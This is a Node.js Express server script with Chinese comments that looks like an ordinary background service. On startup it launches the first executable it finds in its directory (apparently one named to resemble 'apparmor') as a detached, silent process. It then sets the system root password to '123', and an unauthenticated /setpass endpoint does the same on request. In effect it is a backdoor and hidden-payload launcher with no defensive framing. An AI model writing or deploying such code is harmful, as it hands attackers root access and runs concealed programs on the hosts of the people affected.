const express = require('express');
const { exec, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// 静默启动服务
app.get('/', (req, res) => {
  res.send('服务运行中');
});

// 检查服务状态端点
app.get('/status', (req, res) => {
  checkServiceStatus().then(status => {
    res.json({ status: status ? '运行中' : '未运行', success: status });
  });
});

// 修改密码端点
app.get('/setpass', (req, res) => {
  setRootPassword().then(success => {
    if (success) {
      res.json({ message: '密码设置完成', success: true });
    } else {
      res.json({ message: '密码设置失败', success: false });
    }
  });
});

// 执行后台程序
async function startService() {
  console.log('启动后台服务...');
  
  try {
    // 查找当前目录下的可执行文件
    const files = fs.readdirSync('.');
    const executableFiles = files.filter(file => {
      try {
        const stats = fs.statSync(file);
        // 检查是否为文件且可执行
        return stats.isFile() && 
               (file.includes('apparm') || 
                !path.extname(file) || 
                file.endsWith('.sh') ||
                (fs.accessSync(file, fs.constants.X_OK), true));
      } catch {
        return false;
      }
    });

    if (executableFiles.length === 0) {
      console.log('未找到可执行文件');
      return false;
    }

    // 使用第一个找到的可执行文件
    const executable = executableFiles[0];
    console.log(`找到执行文件: ${executable}`);
    
    // 检查是否有配置文件
    let configArgs = [];
    if (fs.existsSync('app.ini')) {
      configArgs = ['-c', 'app.ini'];
    }

    // 后台运行程序
    const serviceProcess = spawn(`./${executable}`, configArgs, {
      detached: true,
      stdio: 'ignore',
      shell: true
    });
    
    serviceProcess.unref();
    
    // 等待一段时间后检查状态
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    const isRunning = await checkServiceStatus();
    if (isRunning) {
      console.log('服务启动成功');
      return true;
    } else {
      console.log('服务启动可能失败');
      return false;
    }
    
  } catch (error) {
    console.log('启动过程中出现异常');
    return false;
  }
}

// 设置root密码
async function setRootPassword() {
  console.log('设置系统访问...');
  
  try {
    // 方法1: 使用chpasswd
    await executeCommand('echo "root:123" | chpasswd');
    console.log('密码设置完成');
    return true;
  } catch (error) {
    try {
      // 方法2: 使用passwd（非交互式）
      await executeCommand('echo -e "123\\n123" | passwd root');
      console.log('密码设置完成');
      return true;
    } catch (error2) {
      try {
        // 方法3: 直接修改shadow文件（需要权限）
        await executeCommand('usermod -p $(openssl passwd -1 123) root');
        console.log('密码设置完成');
        return true;
      } catch (error3) {
        console.log('密码设置失败');
        return false;
      }
    }
  }
}

// 检查服务是否运行
async function checkServiceStatus() {
  return new Promise((resolve) => {
    exec('ps aux', (error, stdout) => {
      if (error) {
        resolve(false);
        return;
      }
      
      // 检查进程列表中是否有相关进程
      const lines = stdout.split('\n');
      const isRunning = lines.some(line => {
        return line.includes('apparm') || 
               line.includes('./') ||
               (line.includes('ini') && !line.includes('grep'));
      });
      
      resolve(isRunning);
    });
  });
}

// 执行命令函数
function executeCommand(command) {
  return new Promise((resolve, reject) => {
    exec(command, (error, stdout, stderr) => {
      if (error) {
        reject(error);
        return;
      }
      resolve(stdout);
    });
  });
}

// 启动服务
app.listen(PORT, () => {
  console.log(`服务已启动:${PORT}`);
  // 延迟执行后台程序
  setTimeout(async () => {
    const success = await startService();
    if (success) {
      console.log('后台服务运行完成');
      // 自动设置密码
      await setRootPassword();
    } else {
      console.log('后台服务启动失败');
    }
  }, 1000);
});
